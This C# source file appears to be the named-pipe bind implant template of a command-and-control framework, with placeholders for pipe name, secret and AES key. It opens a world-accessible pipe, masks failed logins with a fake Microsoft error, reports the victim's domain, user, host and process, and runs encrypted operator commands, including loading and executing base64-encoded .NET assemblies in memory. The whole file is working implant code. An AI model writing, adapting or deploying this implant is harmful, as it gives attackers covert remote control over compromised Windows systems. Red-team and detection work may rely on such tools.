using System;
using System.Linq;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.Text;
using System.Text.RegularExpressions;
using System.Reflection;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Security.Principal;

public class Program
{
	public static string command;
	public static bool kill;
	public static string pipeName;
	public static string encryption;
	public static string secret;
	public static string output;
	public static bool running;
    private static StringWriter backgroundTaskOutput = new StringWriter();

	public static void Sharp()
	{
		Program.pipeName = "#REPLACEPBINDPIPENAME#";
		Program.secret = "#REPLACEPBINDSECRET#";
		Program.encryption = "#REPLACEKEY#";
		Program.kill = false;
		PbindConnect();
	}

	public static void Main()
	{
		Sharp();
	}

	private static void PbindConnect()
    {
        PipeSecurity pipeSecurity = new PipeSecurity();
        var pipeAccessRule = new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, AccessControlType.Allow);
        pipeSecurity.AddAccessRule(pipeAccessRule);
        var pipeServerStream = new NamedPipeServerStream(pipeName, PipeDirection.InOut, 100, PipeTransmissionMode.Byte, PipeOptions.None, 4096, 4096, pipeSecurity);

        try
        {
            pipeServerStream.WaitForConnection();
            running = true;
            var pipeReader = new StreamReader(pipeServerStream);
            var pipeWriter = new StreamWriter(pipeServerStream);
            pipeWriter.AutoFlush = true;
            var ppass = pipeReader.ReadLine();
            var command = "";
            while (running)
            {
                if (ppass != secret)
                {
                    pipeWriter.WriteLine("Microsoft Error: 151337");
                }
                else
                {
                    while (running)
                    {
                        var u = "";
                        try
                        {
                            u = WindowsIdentity.GetCurrent().Name;
                        }
                        catch
                        {
                            u = Environment.UserName;
                        }
                        u += "*";
                        var dn = Environment.UserDomainName;
                        var cn = Environment.GetEnvironmentVariable("COMPUTERNAME");
                        var arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
                        int pid = Process.GetCurrentProcess().Id;
                        Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
                        var o = String.Format("PBind-Connected: {0};{1};{2};{3};{4};", dn, u, cn, arch, pid);
                        var zo = Encrypt(encryption, o);
                        pipeWriter.WriteLine(zo);
                        var exitvt = new ManualResetEvent(false);
                        var output = new StringBuilder();

                        while (running)
                        {
                            var zz = Encrypt(encryption, "COMMAND");
                            pipeWriter.WriteLine(zz);
                            if (pipeServerStream.CanRead)
                            {
                                command = pipeReader.ReadLine();
                                if (!String.IsNullOrWhiteSpace(command))
                                {
                                    var sOutput2 = new StringWriter();

                                    var cmd = Decrypt(encryption, command);

                                    if (cmd.StartsWith("KILL"))
                                    {
                                        running = false;
                                        pipeServerStream.Disconnect();
                                        pipeServerStream.Close();
                                    }
                                    else if (cmd.ToLower().StartsWith("loadmodule"))
                                    {
                                        try
                                        {
                                            var module = Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase);
                                            var assembly = Assembly.Load(Convert.FromBase64String(module));
                                        }
                                        catch (Exception e) { Console.WriteLine($"Error loading modules {e}"); }
                                        sOutput2.WriteLine("Module loaded sucessfully");
                                    }
                                    else if (cmd.ToLower().StartsWith("run-dll-background") || cmd.ToLower().StartsWith("run-exe-background"))
                                    {
                                        Thread t = new Thread(() => RunAssembly(cmd, true));
                                        t.Start();
                                        sOutput2.WriteLine("[+] Running task in background, run get-bg to get background output.");
                                        sOutput2.WriteLine("[*] Only run one task in the background at a time per implant.");
                                    }
                                    else if (cmd.ToLower().StartsWith("run-dll") || cmd.ToLower().StartsWith("run-exe"))
                                    {
                                        var oldOutput = Console.Out;
                                        Console.SetOut(sOutput2);
                                        sOutput2.WriteLine(RunAssembly((cmd)));
                                        Console.SetOut(oldOutput);
                                    }
                                    else if (cmd.ToLower() == "foo")
                                    {
                                        sOutput2.WriteLine("bar");
                                    }
                                    else if(cmd.ToLower() == "get-bg")
                                    {
                                        var backgroundTaskOutputString = backgroundTaskOutput.ToString();
                                        if(!string.IsNullOrEmpty(backgroundTaskOutputString))
                                        {
                                            output.Append(backgroundTaskOutputString);
                                        }
                                        else
                                        {
                                            sOutput2.WriteLine("[-] No output");
                                        }
                                    }
                                    else
                                    {
                                        var oldOutput = Console.Out;
                                        Console.SetOut(sOutput2);
                                        sOutput2.WriteLine(RunAssembly($"run-exe Core.Program Core {cmd}"));
                                        Console.SetOut(oldOutput);
                                    }

                                    output.Append(sOutput2.ToString());
                                    var result = Encrypt(encryption, output.ToString());

                                    pipeWriter.Flush();
                                    pipeWriter.WriteLine(result);
                                    pipeWriter.Flush();

                                    output.Clear();
                                    output.Length = 0;


                                    sOutput2.Flush();
                                    sOutput2.Close();
                                }
                            }
                            else
                            {
                                Console.WriteLine("$[-] Cannot read from pipe");
                            }
                        }
                    }
                }
            }
        }
        catch (Exception e)
        {
            Console.WriteLine("Error: " + e.Message);
            Console.WriteLine(e.StackTrace);
        }
    }

    [DllImport("shell32.dll")] static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);

    private static string[] ParseCommandLineArgs(string cl)
    {
        int argc;
        var argv = CommandLineToArgvW(cl, out argc);
        if (argv == IntPtr.Zero)
            throw new System.ComponentModel.Win32Exception();
        try
        {
            var args = new string[argc];
            for (var i = 0; i < args.Length; i++)
            {
                var p = Marshal.ReadIntPtr(argv, i * IntPtr.Size);
                args[i] = Marshal.PtrToStringUni(p);
            }

            return args;
        }
        finally
        {
            Marshal.FreeHGlobal(argv);
        }
    }

    private static Type LoadAssembly(string assemblyName)
    {
        return Type.GetType(assemblyName, (name) =>
        {
            return AppDomain.CurrentDomain.GetAssemblies().Where(z => z.FullName == name.FullName).LastOrDefault();
        }, null, true);
    }

    private static string RunAssembly(string c, bool background = false)
    {

        var oldOutput = Console.Out;
        if(background)
        {
            backgroundTaskOutput = new StringWriter();
            Console.SetOut(backgroundTaskOutput);
        }
        var splitargs = c.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
        int i = 0;
        var sOut = "";
        string sMethod = "", sta = "", qNme = "", name = "";
        foreach (var a in splitargs)
        {
            if (i == 1)
                qNme = a;
            if (i == 2)
                name = a;
            if (c.ToLower().StartsWith("run-exe"))
            {
                if (i > 2)
                    sta = sta + " " + a;
            }
            else
            {
                if (i == 3)
                    sMethod = a;
                else if (i > 3)
                    sta = sta + " " + a;
            }
            i++;
        }
        string[] l = ParseCommandLineArgs(sta);
        var asArgs = l.Skip(1).ToArray();
        foreach (var Ass in AppDomain.CurrentDomain.GetAssemblies())
        {
            if (Ass.FullName.ToString().ToLower().StartsWith(name.ToLower()))
            {
                var lTyp = LoadAssembly(qNme + ", " + Ass.FullName);
                try
                {
                    if (c.ToLower().StartsWith("run-exe"))
                    {
                        object output = null;
                        output = lTyp.Assembly.EntryPoint.Invoke(null, new object[] { asArgs });
                        if (output != null)
                        {
                            sOut = output.ToString();
                        }
                    }
                    else
                    {
                        try
                        {
                            object output = null;
                            output = lTyp.Assembly.GetType(qNme).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, asArgs).ToString();
                            if (output != null)
                            {
                                sOut = output.ToString();
                            }
                        }
                        catch
                        {
                            object output = null;
                            output = lTyp.Assembly.GetType(qNme).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, null).ToString();
                            if (output != null)
                            {
                                sOut = output.ToString();
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("RAsm Exception: " + e.Message);
                    Console.WriteLine(e.StackTrace);
                }
                break;
            }
        }
        if(background)
        {
            Console.SetOut(oldOutput);
            backgroundTaskOutput.WriteLine(sOut);
        }
        return sOut;
    }

    private static string Decrypt(string key, string ciphertext)
    {
        var rawCipherText = Convert.FromBase64String(ciphertext);
        var IV = new Byte[16];
        Array.Copy(rawCipherText, IV, 16);
        try
        {
            var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV));
            var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
            return Encoding.UTF8.GetString(decrypted.Where(x => x > 0).ToArray());
        }
        catch
        {
            var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV), false);
            var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
            return Encoding.UTF8.GetString(decrypted.Where(x => x > 0).ToArray());
        }
        finally
        {
            Array.Clear(rawCipherText, 0, rawCipherText.Length);
            Array.Clear(IV, 0, 16);
        }
    }

    private static string Encrypt(string key, string un, bool comp = false, byte[] unByte = null)
    {
        byte[] byEnc;
        if (unByte != null)
            byEnc = unByte;
        else
            byEnc = Encoding.UTF8.GetBytes(un);

        if (comp)
            byEnc = GzipCompress(byEnc);

        try
        {
            var a = CreateEncryptionAlgorithm(key, null);
            var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
            return Convert.ToBase64String(CombineArrays(a.IV, f));
        }
        catch
        {
            var a = CreateEncryptionAlgorithm(key, null, false);
            var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
            return Convert.ToBase64String(CombineArrays(a.IV, f));
        }
    }

    private static SymmetricAlgorithm CreateEncryptionAlgorithm(string key, string IV, bool rij = true)
    {
        SymmetricAlgorithm algorithm;
        if (rij)
            algorithm = new RijndaelManaged();
        else
            algorithm = new AesCryptoServiceProvider();

        algorithm.Mode = CipherMode.CBC;
        algorithm.Padding = PaddingMode.Zeros;
        algorithm.BlockSize = 128;
        algorithm.KeySize = 256;

        if (null != IV)
            algorithm.IV = Convert.FromBase64String(IV);
        else
            algorithm.GenerateIV();

        if (null != key)
            algorithm.Key = Convert.FromBase64String(key);

        return algorithm;
    }

    private static byte[] GzipCompress(byte[] raw)
    {
        using (MemoryStream memory = new MemoryStream())
        {
            using (GZipStream gzip = new GZipStream(memory, CompressionMode.Compress, true))
            {
                gzip.Write(raw, 0, raw.Length);
            }
            return memory.ToArray();
        }
    }

    private static byte[] CombineArrays(byte[] first, byte[] second)
    {
        byte[] ret = new byte[first.Length + second.Length];
        Buffer.BlockCopy(first, 0, ret, 0, first.Length);
        Buffer.BlockCopy(second, 0, ret, first.Length, second.Length);
        return ret;
    }
}